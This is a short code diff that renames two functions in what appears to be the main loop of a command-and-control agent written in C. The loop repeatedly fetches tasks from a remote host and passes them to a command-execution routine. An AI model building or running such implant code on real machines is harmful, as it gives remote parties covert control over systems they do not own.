@@ -36,7 +36,7 @@ int main() {
     while (1) {
       printf("fetching commands..\n");
 
-      http_getrequest(host, port, agent.report_uri, 1024, &httpBytesRead, tasksBuffer);
+      httpGet(host, port, agent.report_uri, 1024, &httpBytesRead, tasksBuffer);
       tasksBuffer[httpBytesRead] = 0x00;
       tasksTLV.allocsize = 1024;
       tasksTLV.buf = tasksBuffer;
@@ -62,7 +62,7 @@ int main() {
         // tlvArgs.allocsize = argBytes + 1;
         // PRINT_HEX(tlvArgs.buf, tlvArgs.bufsize);
 
-        execute_cmd(taskActionId, taskId, extractInt32(&tlvArgs), &tlvArgs);
+        executeCmd(taskActionId, taskId, extractInt32(&tlvArgs), &tlvArgs);
 
         free(args);
       }
